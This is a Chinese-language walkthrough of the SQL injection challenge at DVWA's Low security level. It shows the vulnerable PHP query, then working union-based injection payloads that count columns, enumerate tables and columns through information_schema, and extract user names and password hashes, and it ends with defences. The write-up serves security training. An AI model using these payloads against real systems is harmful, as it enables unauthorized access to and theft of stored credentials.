# DVWA SQL Injection (Low) 通关 WriteUp

## 一、漏洞环境与原理

将 DVWA 安全级别设置为 **Low**。查看后端 PHP 源码可以发现，`id` 参数未经任何过滤便直接拼接到 SQL 查询语句中：

```php
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

这意味着用户输入被数据库当作 SQL 代码的一部分执行，攻击者可以通过构造恶意输入改变查询逻辑。该级别是四种难度中最基础、最直观的注入场景，也是理解 SQL 注入原理的最佳起点。

## 二、手工注入完整流程

### 1\. 判断提交方式与注入类型

在 User ID 输入框中提交 `1`，观察到 URL 地址栏出现 `?id=1`，由此判断提交方式为 **GET** 请求。

接着提交 `1'`，页面返回数据库报错信息（多出一个单引号），说明参数被单引号包裹，属于**字符型注入**。进一步提交 `1' or 1=1#`，页面返回全部用户记录，确认注入点存在且注释符 `#` 有效。

### 2\. 判断字段数量

使用 `ORDER BY` 确定原始查询的列数：

```sql
1' order by 1#    -- 正常
1' order by 2#    -- 正常
1' order by 3#    -- 报错
```

`order by 3` 返回错误，说明当前查询语句共有 **2 个字段**。

### 3\. 确定回显位置

构造联合查询确认两个字段是否都能在页面上回显：

```sql
1' union select 1,2#
```

页面中 First name 和 Surname 位置分别显示 `1` 和 `2`，说明两个字段均可用于数据回显。

### 4\. 获取数据库信息

**获取数据库版本：**

```sql
1' union select version(),2#
```

**获取当前数据库名：**

```sql
1' union select database(),2#
```

返回结果为 `dvwa`，确认当前数据库名。

### 5\. 获取表名

利用 MySQL 系统库 `information_schema.tables` 查询 `dvwa` 数据库中的所有表：

```sql
1' union select table_name,2 from information_schema.tables where table_schema='dvwa'#
```

成功获取表名，其中包含关键表 **users**。

### 6\. 获取字段名

查询 `users` 表的字段信息：

```sql
1' union select column_name,2 from information_schema.columns where table_name='users'#
```

得到字段：`user_id`、`first_name`、`last_name`、`user`、`password` 等。

### 7\. 提取用户账号与密码

最终构造 Payload 获取用户名和密码哈希：

```sql
1' union select user,password from users#
```

成功回显所有用户的用户名及密码哈希值（MD5 格式），完成数据提取。

## 三、漏洞成因与防御

**成因**：用户输入未经过滤直接拼接进入 SQL 语句，数据库将用户输入当作 SQL 代码执行。

**防御措施**：

- **参数化查询（推荐）**：使用 PDO 预编译语句，使参数与 SQL 语句分离，用户输入被当作纯数据处理。
- **输入校验**：对用户输入进行严格的类型检查和白名单验证。

  
